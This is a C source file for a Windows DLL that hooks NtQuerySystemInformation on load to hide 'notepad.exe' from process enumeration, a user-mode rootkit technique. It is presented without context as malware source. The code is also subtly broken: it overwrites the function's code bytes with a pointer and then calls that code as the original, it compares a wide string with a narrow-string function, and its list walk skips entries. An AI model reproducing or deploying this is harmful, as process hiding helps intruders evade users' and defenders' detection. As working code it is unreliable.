#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

pNtQuerySystemInformation OriginalNtQuerySystemInformation = NULL;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
    {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

        while (pCurrent->NextEntryOffset != 0)
        {
            if (_stricmp((char*)pCurrent->ImageName.Buffer, "notepad.exe") == 0)
            {
                if (pPrevious)
                {
                    pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                }
                else
                {
                    if (pCurrent->NextEntryOffset != 0)
                    {
                        *(PSYSTEM_PROCESS_INFORMATION)SystemInformation = *(PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
                    }
                }
            }
            pPrevious = pCurrent;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }

    return status;
}

void HookFunction()
{
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll)
    {
        OriginalNtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
        if (OriginalNtQuerySystemInformation)
        {
            DWORD oldProtect;
            VirtualProtect(OriginalNtQuerySystemInformation, sizeof(pNtQuerySystemInformation), PAGE_EXECUTE_READWRITE, &oldProtect);
            *(pNtQuerySystemInformation*)OriginalNtQuerySystemInformation = HookedNtQuerySystemInformation;
            VirtualProtect(OriginalNtQuerySystemInformation, sizeof(pNtQuerySystemInformation), oldProtect, &oldProtect);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        HookFunction();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
